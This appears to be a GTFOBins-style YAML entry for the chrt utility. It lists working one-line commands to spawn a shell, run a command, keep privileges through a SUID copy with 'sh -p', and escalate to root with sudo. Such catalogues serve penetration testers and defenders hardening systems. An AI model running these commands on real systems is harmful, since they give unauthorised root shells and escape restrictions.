---
functions:
  shell:
    - code: chrt 26 /bin/sh
  command:
    - code: |
        COMMAND='/usr/bin/id'
        chrt 26 "$COMMAND"
  suid:
    - code: ./chrt 26 sh -p -c 'reset; exec sh -p 1>&0 2>&0'
  sudo:
    - code: sudo chrt 26 /bin/sh
---
